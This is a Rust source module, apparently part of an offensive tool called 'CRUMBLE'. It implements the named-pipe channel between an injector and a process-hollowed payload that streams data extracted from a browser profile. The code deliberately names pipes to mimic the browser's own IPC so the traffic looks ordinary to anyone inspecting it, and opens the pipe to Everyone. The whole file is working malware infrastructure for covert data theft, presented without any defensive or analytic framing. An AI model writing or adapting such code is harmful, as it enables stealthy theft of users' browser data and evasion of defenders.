//! Named-pipe transport between the injector and the hollowed payload.
//!
//! The pipe carries the payload's extraction stream (frames per
//! [`crate::wire`]). Names mimic the browser's own IPC pattern
//! (`\\.\pipe\{browser}.nacl.<nonce>`) so a pipe listing looks like ordinary
//! browser traffic; the nonce is drawn from the OS CSPRNG so the name is
//! unguessable — a predictable name invites squatting by another local
//! process. The permissive Everyone DACL is deliberate: the payload may run
//! as the profile-owning user (different from us when elevated), and the real
//! guards are the unguessable name, the per-frame auth token, and the
//! client-PID check.
#![allow(unsafe_code)]

use std::time::{Duration, Instant};

use windows_sys::Win32::Foundation::{
    LocalFree, ERROR_BROKEN_PIPE, ERROR_FILE_NOT_FOUND, ERROR_PIPE_BUSY, ERROR_PIPE_CONNECTED,
    GENERIC_READ, GENERIC_WRITE, HANDLE,
};
use windows_sys::Win32::Security::Authorization::ConvertStringSecurityDescriptorToSecurityDescriptorW;
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, FlushFileBuffers, ReadFile, WriteFile, FILE_FLAG_FIRST_PIPE_INSTANCE,
    OPEN_EXISTING, PIPE_ACCESS_DUPLEX,
};
use windows_sys::Win32::System::Pipes::{
    ConnectNamedPipe, CreateNamedPipeW, GetNamedPipeClientProcessId, WaitNamedPipeW,
    PIPE_READMODE_BYTE, PIPE_REJECT_REMOTE_CLIENTS, PIPE_TYPE_BYTE, PIPE_WAIT,
};

use crate::wire::{codec, MAX_FRAME_BYTES};

use super::{last_error, wide, OwnedHandle};

/// Environment variable carrying the pipe name to the payload.
pub const PIPE_ENV: &str = "CRUMBLE_PIPE";

/// Pipe buffer size (1 MiB each direction).
const PIPE_BUF: u32 = 1024 * 1024;
/// SDDL revision (sddl.h).
const SDDL_REVISION_1: u32 = 1;

/// Builds a browser-mimicking, unguessable pipe name for one exchange.
#[must_use]
pub fn pipe_name(browser: &str, seed: u64) -> String {
    let mut nonce = [0u8; 8];
    let nonce = match getrandom::getrandom(&mut nonce) {
        Ok(()) => u64::from_le_bytes(nonce),
        Err(_) => seed,
    };
    format!(r"\\.\pipe\{browser}.nacl.{nonce:016X}")
}

/// The injector's end: a listening named-pipe server for ONE client.
pub struct Listener {
    handle: OwnedHandle,
    decoder: codec::Decoder,
}

// SAFETY: the HANDLE is wholly owned by this value and each Listener is used
// by exactly one reader thread, so accesses are serialized.
unsafe impl Send for Listener {}

impl Listener {
    /// Creates a byte-mode named pipe (single instance), Everyone read+write,
    /// strictly local (`PIPE_REJECT_REMOTE_CLIENTS`); creation fails if a
    /// squatter already owns the name.
    pub fn listen(name: &str) -> anyhow::Result<Self> {
        let security = everyone_rw_attributes()?;
        // SAFETY: all parameters are valid; `security` points at a live
        // SECURITY_ATTRIBUTES for the call's duration (freed on drop).
        let handle = unsafe {
            CreateNamedPipeW(
                wide(name).as_ptr(),
                PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
                1,
                PIPE_BUF,
                PIPE_BUF,
                0,
                &security.attributes,
            )
        };
        if handle.is_null() || handle == -1isize as HANDLE {
            return Err(last_error("CreateNamedPipeW"));
        }
        Ok(Self {
            handle: OwnedHandle::new(handle),
            decoder: codec::Decoder::new(),
        })
    }

    /// Blocks until the payload connects (returns immediately if it already
    /// has — a raced connect shows ERROR_PIPE_CONNECTED).
    pub fn wait_connected(&self) -> anyhow::Result<()> {
        // SAFETY: live pipe handle.
        let ok = unsafe { ConnectNamedPipe(self.handle.raw(), std::ptr::null_mut()) };
        if ok == 0 {
            // SAFETY: called immediately after the failed API.
            let code = unsafe { windows_sys::Win32::Foundation::GetLastError() };
            if code != ERROR_PIPE_CONNECTED {
                return Err(last_error("ConnectNamedPipe"));
            }
        }
        Ok(())
    }

    /// Verifies the connected client's PID is the spawned payload's — call
    /// after [`wait_connected`] so a same-user racer is rejected, not read.
    pub fn verify_client_pid(&self, expected: u32) -> anyhow::Result<()> {
        let mut pid = 0u32;
        // SAFETY: live server pipe handle; `pid` valid for write.
        let ok = unsafe { GetNamedPipeClientProcessId(self.handle.raw(), &mut pid) };
        if ok == 0 {
            return Err(last_error("GetNamedPipeClientProcessId"));
        }
        if pid != expected {
            anyhow::bail!("pipe client is not the spawned payload process (pid {pid})");
        }
        Ok(())
    }

    /// Reads the next frame; `Ok(None)` = the client closed its end (or died,
    /// which surfaces as a broken pipe).
    pub fn read_frame(&mut self) -> anyhow::Result<Option<Vec<u8>>> {
        let mut chunk = [0u8; 64 * 1024];
        loop {
            for frame in self.decoder.push(&[]) {
                return Ok(Some(frame));
            }
            let mut read = 0u32;
            // SAFETY: live pipe handle; `chunk` writable for its length.
            let ok = unsafe {
                ReadFile(
                    self.handle.raw(),
                    chunk.as_mut_ptr(),
                    chunk.len() as u32,
                    &mut read,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                // SAFETY: called immediately after the failed API.
                let code = unsafe { windows_sys::Win32::Foundation::GetLastError() };
                return if code == ERROR_BROKEN_PIPE {
                    Ok(None)
                } else {
                    Err(last_error("ReadFile(pipe)"))
                };
            }
            if read == 0 {
                return Ok(None);
            }
            for frame in self.decoder.push(&chunk[..read as usize]) {
                return Ok(Some(frame));
            }
        }
    }
}

/// The payload's end: a connected pipe client.
pub struct Client {
    handle: OwnedHandle,
}

impl Client {
    /// Connects to `name`, retrying while the pipe is busy or not yet
    /// created, until `timeout` elapses.
    pub fn connect(name: &str, timeout: Duration) -> anyhow::Result<Self> {
        let name_wide = wide(name);
        let deadline = Instant::now() + timeout;
        loop {
            // SAFETY: opening an existing pipe by name with default sharing.
            let handle = unsafe {
                CreateFileW(
                    name_wide.as_ptr(),
                    GENERIC_READ | GENERIC_WRITE,
                    0,
                    std::ptr::null(),
                    OPEN_EXISTING,
                    0,
                    std::ptr::null_mut(),
                )
            };
            if !(handle.is_null() || handle == -1isize as HANDLE) {
                return Ok(Self {
                    handle: OwnedHandle::new(handle),
                });
            }
            if Instant::now() >= deadline {
                return Err(last_error("CreateFileW(pipe)"));
            }
            // SAFETY: called immediately after the failed CreateFileW.
            let code = unsafe { windows_sys::Win32::Foundation::GetLastError() };
            if code == ERROR_PIPE_BUSY {
                // SAFETY: the name is a valid wide string.
                unsafe { WaitNamedPipeW(name_wide.as_ptr(), 1_000) };
            } else if code != ERROR_FILE_NOT_FOUND {
                return Err(last_error("CreateFileW(pipe)"));
            }
            std::thread::sleep(Duration::from_millis(50));
        }
    }

    /// Writes one frame; over-sized payloads are rejected before touching the
    /// wire.
    pub fn write_frame(&self, payload: &[u8]) -> anyhow::Result<()> {
        if payload.len() > MAX_FRAME_BYTES {
            anyhow::bail!("frame exceeds {} bytes", MAX_FRAME_BYTES);
        }
        write_all(self.handle.raw(), &codec::encode(payload))
    }

    /// Flushes buffers so the reader sees everything before the payload
    /// exits; best-effort (a dead reader is unactionable at that point).
    pub fn flush(&self) {
        // SAFETY: live pipe handle.
        unsafe { FlushFileBuffers(self.handle.raw()) };
    }
}

/// Writes `data` in full, looping on short writes; a zero-byte "success" is
/// reported as an error rather than spinning forever.
fn write_all(handle: HANDLE, data: &[u8]) -> anyhow::Result<()> {
    let mut done = 0usize;
    while done < data.len() {
        let mut wrote = 0u32;
        let slice = &data[done..];
        let want = slice.len().min(PIPE_BUF as usize);
        // SAFETY: live pipe handle; `slice` readable for `want` bytes.
        let ok = unsafe {
            WriteFile(
                handle,
                slice.as_ptr(),
                want as u32,
                &mut wrote,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(last_error("WriteFile(pipe)"));
        }
        if wrote == 0 {
            anyhow::bail!("pipe write made no progress");
        }
        done += wrote as usize;
    }
    Ok(())
}

/// A `SECURITY_ATTRIBUTES` granting Everyone read+write, with the backing
/// descriptor freed on drop.
struct EveryoneRw {
    attributes: windows_sys::Win32::Security::SECURITY_ATTRIBUTES,
    descriptor: *mut std::ffi::c_void,
}

impl Drop for EveryoneRw {
    fn drop(&mut self) {
        if !self.descriptor.is_null() {
            // SAFETY: `descriptor` came from
            // ConvertStringSecurityDescriptorToSecurityDescriptorW
            // (LocalAlloc) and is freed exactly once.
            unsafe { LocalFree(self.descriptor.cast()) };
        }
    }
}

/// Builds the Everyone read+write DACL (`D:(A;;GRGW;;;WD)`); any failure is
/// an error rather than a silently default-secured pipe.
fn everyone_rw_attributes() -> anyhow::Result<EveryoneRw> {
    let mut sd: windows_sys::Win32::Security::PSECURITY_DESCRIPTOR = std::ptr::null_mut();
    // SAFETY: `sddl` is a valid NUL-terminated wide string; `sd` is valid for
    // write and, on success, owned by the returned guard.
    let ok = unsafe {
        ConvertStringSecurityDescriptorToSecurityDescriptorW(
            wide("D:(A;;GRGW;;;WD)").as_ptr(),
            SDDL_REVISION_1,
            &mut sd,
            std::ptr::null_mut(),
        )
    };
    if ok == 0 || sd.is_null() {
        return Err(last_error(
            "ConvertStringSecurityDescriptorToSecurityDescriptorW",
        ));
    }
    Ok(EveryoneRw {
        attributes: windows_sys::Win32::Security::SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<windows_sys::Win32::Security::SECURITY_ATTRIBUTES>()
                as u32,
            lpSecurityDescriptor: sd,
            bInheritHandle: 0,
        },
        descriptor: sd,
    })
}
